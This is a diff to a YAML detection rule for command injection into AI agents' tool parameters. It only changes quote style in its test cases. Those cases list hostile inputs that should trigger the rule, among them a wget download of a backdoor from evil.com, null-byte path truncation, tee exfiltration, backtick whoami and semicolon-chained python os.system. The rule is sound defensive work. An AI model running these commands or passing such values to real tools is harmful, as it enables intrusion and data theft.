@@ -10,7 +10,7 @@ description: |
   commands in vulnerable parsers.
 author: ATR Community
 date: 2026/03/26
-schema_version: "0.1"
+schema_version: '0.1'
 detection_tier: pattern
 maturity: experimental
 severity: critical
@@ -99,19 +99,19 @@ test_cases:
       description: Logical AND chained to exfiltration
     - input: Upload the report to /tmp/output%00.pdf
       expected: triggered
-      description: "Null byte injection in filename argument to truncate path (matches pattern 6: %00)"
+      description: 'Null byte injection in filename argument to truncate path (matches pattern 6: %00)'
     - input: grep 'error' /var/log/app.log | tee /tmp/exfil.txt
       expected: triggered
-      description: "Pipe to tee command for data exfiltration (matches pattern 5: | tee)"
+      description: 'Pipe to tee command for data exfiltration (matches pattern 5: | tee)'
     - input: echo hello || wget http://evil.com/backdoor.sh
       expected: triggered
-      description: "Logical OR chained to wget download (matches pattern 4: || wget)"
+      description: 'Logical OR chained to wget download (matches pattern 4: || wget)'
     - input: list files in `whoami`
       expected: triggered
-      description: "Backtick command substitution with whoami (matches pattern 3: `whoami`)"
+      description: 'Backtick command substitution with whoami (matches pattern 3: `whoami`)'
     - input: save to path; python -c 'import os; os.system("id")'
       expected: triggered
-      description: "Semicolon injection chaining to python execution (matches pattern 1: ; python)"
+      description: 'Semicolon injection chaining to python execution (matches pattern 1: ; python)'
   true_negatives:
     - input: Run the build script using npm run build to compile the project.
       tool_description: build-runner
